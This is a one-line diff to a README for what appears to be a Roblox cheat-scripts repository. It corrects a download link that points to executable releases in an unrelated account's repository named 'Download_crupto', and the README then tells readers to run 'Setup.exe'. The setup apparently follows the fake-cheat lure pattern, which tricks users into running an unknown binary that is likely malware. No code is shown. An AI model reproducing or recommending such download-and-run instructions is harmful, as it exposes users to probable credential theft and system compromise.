@@ -28,7 +28,7 @@
 
 ## How to run
 
--[<img src="https://github.com/staun90frith/Roblox-Cheat-Scripts/assets/166328144/d5d1b185-994f-4ece-92bb-631049b4203f"/>](https://github.com/soulkeeper297/Download_crupto/releases/tag/Downloadd)
+-[<img src="https://github.com/staun90frith/Roblox-Cheat-Scripts/assets/166328144/d5d1b185-994f-4ece-92bb-631049b4203f"/>](https://github.com/soulkeeper297/Download_crupto/releases/tag/Download)
 
 - Run - Setup.exe
 
